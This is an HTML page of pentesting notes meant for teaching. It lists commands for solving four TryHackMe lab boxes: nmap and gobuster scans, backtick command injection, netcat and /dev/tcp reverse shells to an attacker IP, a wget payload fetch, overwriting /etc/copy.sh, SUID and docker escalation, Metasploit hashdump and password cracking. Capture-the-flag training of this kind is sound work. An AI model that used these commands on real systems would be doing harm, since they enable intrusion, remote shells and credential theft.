<h1>Key commands listed under each box</h1>
</br> by listing key commands, this will help teachers present relevant material PRIOR to getting students to try a box
</br> I won't repeat the super-common stuff, but the main ideas.
</br> by looking for various concepts, you can better organize teaching materials, AND find boxes that demonstrate them
<h2>Purpose</h2>
</br> Shows complete list of commands at the start of the walkthrough (quick overview and command/syntax refresher)
</br> documents the notes I make in a report while pen-testing a box.
</br> These are not as clean as an "official" pentest report, but document the processing in a functional manner, so that another person would be able to comprehend the methodology and see how a goal is accomplished from the notes herein. 

<h2>Current boxes done in this manner:</h2>

</br> 1) UltraTech (tryHackMe)
- <b>sudo nmap -sS -T4 -A -p- <ip.addr> -oN scanOutput.txt</b>
- <b>gobuster dir -u http://<ip.adr>:<port> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</b>
</br> (directory searching assumes you have the directory-list in the path /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt)
- <b>wfuzz -c -f sub-fighter -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hw <wordcount-to-exclude>  http://10.10.61.189:31331/FUZZ </b>
- vuln API in a js file found. --> [ const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}` ]
- backticks allow us to run a command with higher priority! -->
</br> <b> <ip.target>:<port>/ping?ip=`ls`</b>
- show contents of a discovered sql database
<b> http://10.10.61.189:8081/ping?ip=`cat utech.db.sqlite` </b>
- Serve up file shuffle to get LinEnum on target --> <b> Python -m SimpleHTTPServer 8080.</b>
(note tha port 8080 has to be used if 80 is busy)
- Make sure LinEnum is transferred to target via wget (similar to curl)
<b> wget http://<ip.attacker>:8080/LinEnum.sh </b>
—> <b>chmod +x LinEnum.sh</b>
- <b> docker found </b>, so GTFO bin helps us break out --> <b> docker run -v /:/mnt --rm -it bash chroot /mnt sh</b>

</br> 2) Lazy Admin (tryHackMe)
- sweetrice data exposure : url variation of  [ http://localhost/inc/mysql_backup ] 
</br> webfiles at [http://localhost/SweetRice-transfer.zip]
- file upload vector in "media center" for sweetrice's admin panel
- use php reverse shell and set up netcat to catch the shell https://github.com/pentestmonkey/php-reverse-shell
-  <b>sudo -l  </b>,(finds) backup.pl (which calls) /etc/copy.sh (which runs a reverse shell of its own out to some ip, presumably for serving backup data)
- overwrite copy.sh file via CLI -->  <b>,echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.253.178 5554 >/tmp/f" > /etc/copy.sh </b>,

</br> 3) Anonymous(v6) (tryHackMe)
- Ftp anonymous login
</br> ftp <ip>
</br> username: anonymous
</br> Pass: anonymous 
- ftp commands
</br> <b>prompt off</b>
</br> (transfer files without asking for confirmation)
</br> <b>Binary </b>
</br> (make sure binary transfer is made so ASCII doesn’t mess up file contents)
</br> <b>Mget *</b>
- one-liner reverse shell, listening on port 1776
</br> <b> bash -i >& /dev/tcp/<ip.for.atk>/1776 0>&1</b>
- ftp overwrite via "put"
</br> The ftp command “put” will overwrite a file of the same name if put in the same <dir>. This allows you to delete or replace logic continued in a file via this “same-name put-overwrite”
- Check programs with suid bit set
<b>find / -type f -perm -04000 -ls 2>/dev/null</b>
- /env is a priority if found with suid bit set
</br> From GTFO bins
</br> <b>/path/to/env /bin/sh -p</b>

</br> 4) Blue (tryHackMe)
- nmap script scan looking for common vulns
</br> <b> nmap -sV -sC --script vuln -oN scanBlue.txt 10.10.73.63 </b>
- msfconsole search (used on exploit name found from external research from CVE hits found in the nmap scan)
- msfconsole basic usage of an exploit (reading and understanding options is important)
- <b> search shell_to_meterpreter</b> for escalating from basic shell to meterpreter
  </br> backgrounding with ctrl + z , and managing sessions
  </br> <b> session -i 1 </b> to interact with session id 1 and bring it from background to foreground.
- migrate process to spoolsv.exe, finding its process with <b>ps</b>
- hashdump -> get hash info from meterpreter session
- cracking with jon the ripper
<br> <b> echo ‘name:1000:hashpt1:hashpt2:::’ > myhash.txt</b> (get hash into text file quick)
<br> (process textfile by jon the ripper) <b>john myhash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt </b>
- SAM file is located in <b>  C://windows/System32/config </b>
